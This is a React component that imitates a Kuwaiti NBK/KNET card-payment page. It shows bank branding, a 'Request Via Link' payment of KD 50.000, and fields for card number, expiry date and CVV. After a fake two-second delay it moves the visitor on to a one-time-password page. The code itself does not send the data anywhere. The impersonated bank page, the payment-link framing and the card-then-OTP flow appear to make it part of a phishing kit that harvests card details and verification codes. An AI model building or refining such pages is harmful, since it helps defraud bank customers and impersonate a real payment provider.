
import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const CardDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: ""
  });
  const [loading, setLoading] = useState(false);

  const formatCardNumber = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '');
    const formatted = digitsOnly.replace(/(.{4})/g, '$1 ').trim();
    return formatted.slice(0, 19);
  };

  const handleInputChange = (field: string, value: string) => {
    if (field === 'cardNumber') {
      setFormData({...formData, [field]: formatCardNumber(value)});
    } else if (field === 'cvv') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 3)});
    } else if (field === 'expiryMonth') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 2)});
    } else if (field === 'expiryYear') {
      setFormData({...formData, [field]: value.replace(/\D/g, '').slice(0, 4)});
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    
    setTimeout(() => {
      navigate(`/otp/${id}`);
    }, 2000);
  };

  const handleCancel = () => {
    navigate('/error');
  };

  return (
    <div className="min-h-screen" style={{ backgroundColor: '#e8e8e8' }}>
      {/* NBK Advertisement Banner */}
      <div className="w-full h-40 bg-gradient-to-r from-blue-300 to-blue-500 relative overflow-hidden">
        <img 
          src="/lovable-uploads/f56c2921-0e1e-4fcd-9d6b-ad411a70a3bc.png" 
          alt="NBK Advertisement" 
          className="w-full h-full object-cover"
        />
      </div>

      <div className="container mx-auto px-6 py-8 max-w-2xl">
        {/* NBK Header Card */}
        <div className="bg-white rounded-3xl shadow-lg p-8 mb-6" style={{ borderRadius: '24px', boxShadow: '0 8px 32px rgba(0,0,0,0.1)' }}>
          <div className="text-center mb-8">
            <div className="flex items-center justify-center mb-6">
              <div className="flex items-center">
                <div className="text-3xl font-bold text-blue-800 ml-3">الوطني</div>
                <div className="text-3xl font-bold text-blue-600">NBK</div>
                <div className="w-10 h-8 bg-blue-800 rounded ml-3 flex items-center justify-center">
                  <div className="w-6 h-4 bg-white rounded-sm"></div>
                </div>
              </div>
            </div>
          </div>
          
          <div className="border-t border-gray-300 pt-6">
            <div className="flex justify-between items-center mb-6 text-lg">
              <span className="text-blue-600 font-medium">Request Via Link</span>
              <span className="text-gray-800 font-medium">:المستفيد</span>
            </div>
            <div className="border-t border-gray-300 pt-4">
              <div className="flex justify-between items-center text-xl">
                <span className="text-blue-600 font-bold">KD 50.000</span>
                <span className="text-gray-800 font-medium">:المبلغ</span>
              </div>
            </div>
          </div>
        </div>

        {/* Payment Form Card */}
        <div className="bg-white rounded-3xl shadow-lg p-8 mb-6" style={{ borderRadius: '24px', boxShadow: '0 8px 32px rgba(0,0,0,0.1)' }}>
          <form onSubmit={handleSubmit} className="space-y-8">
            {/* Bank Selection */}
            <div className="space-y-3">
              <div className="flex justify-between items-center">
                <select className="flex-1 p-4 border-2 border-gray-300 rounded-xl text-center bg-white text-gray-700 text-lg" style={{ borderRadius: '12px' }}>
                  <option>يرجى اختيار البنك</option>
                </select>
                <label className="text-blue-600 font-medium mr-6 whitespace-nowrap text-lg">:يرجى اختيار البنك</label>
              </div>
            </div>

            {/* Card Number */}
            <div className="space-y-3">
              <div className="flex justify-between items-center">
                <div className="flex space-x-3 flex-1">
                  <select className="w-28 p-4 border-2 border-gray-300 rounded-xl text-center bg-white text-gray-700" style={{ borderRadius: '12px' }}>
                    <option>بادئة</option>
                  </select>
                  <Input
                    type="text"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                    className="flex-1 p-4 border-2 border-blue-500 rounded-xl text-center text-lg"
                    style={{ borderRadius: '12px', borderColor: '#3b82f6' }}
                    placeholder=""
                  />
                </div>
                <label className="text-blue-600 font-medium mr-6 whitespace-nowrap text-lg">:رقم بطاقة الصرف الآلي</label>
              </div>
            </div>

            {/* Expiry Date */}
            <div className="space-y-3">
              <div className="flex justify-between items-center">
                <div className="flex space-x-3">
                  <select 
                    value={formData.expiryYear}
                    onChange={(e) => handleInputChange('expiryYear', e.target.value)}
                    className="w-28 p-4 border-2 border-gray-300 rounded-xl text-center bg-white text-gray-700"
                    style={{ borderRadius: '12px' }}
                  >
                    <option value="">YYYY</option>
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                  </select>
                  <select 
                    value={formData.expiryMonth}
                    onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
                    className="w-28 p-4 border-2 border-gray-300 rounded-xl text-center bg-white text-gray-700"
                    style={{ borderRadius: '12px' }}
                  >
                    <option value="">MM</option>
                    {Array.from({length: 12}, (_, i) => (
                      <option key={i+1} value={String(i+1).padStart(2, '0')}>
                        {String(i+1).padStart(2, '0')}
                      </option>
                    ))}
                  </select>
                </div>
                <label className="text-blue-600 font-medium mr-6 whitespace-nowrap text-lg">:تاريخ انتهاء البطاقة</label>
              </div>
            </div>

            {/* CVV */}
            <div className="space-y-3">
              <div className="flex justify-between items-center">
                <Input
                  type="text"
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  className="flex-1 p-4 border-2 border-blue-500 rounded-xl text-center text-lg"
                  style={{ borderRadius: '12px', borderColor: '#3b82f6' }}
                  placeholder=""
                  maxLength={3}
                />
                <label className="text-blue-600 font-medium mr-6 whitespace-nowrap text-lg">:الرقم السري</label>
              </div>
            </div>
          </form>
        </div>

        {/* Action Buttons Card */}
        <div className="bg-white rounded-3xl shadow-lg p-8" style={{ borderRadius: '24px', boxShadow: '0 8px 32px rgba(0,0,0,0.1)' }}>
          <div className="flex space-x-6">
            <button
              onClick={handleCancel}
              className="flex-1 bg-gray-300 text-gray-800 py-5 rounded-2xl text-xl font-medium hover:bg-gray-400 transition-colors"
              style={{ borderRadius: '16px' }}
              disabled={loading}
            >
              إلغاء
            </button>
            <button
              onClick={() => navigate(`/otp/${id}`)}
              className="flex-1 bg-gray-300 text-gray-800 py-5 rounded-2xl text-xl font-medium hover:bg-gray-400 transition-colors"
              style={{ borderRadius: '16px' }}
              disabled={loading}
            >
              {loading ? 'جاري التحميل...' : 'إرسال'}
            </button>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-12 text-gray-700">
          <div className="text-lg mb-3 font-medium">جميع الحقوق محفوظة © 2025</div>
          <div className="text-lg text-blue-600 font-medium">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
        </div>
      </div>
    </div>
  );
};

export default CardDetails;
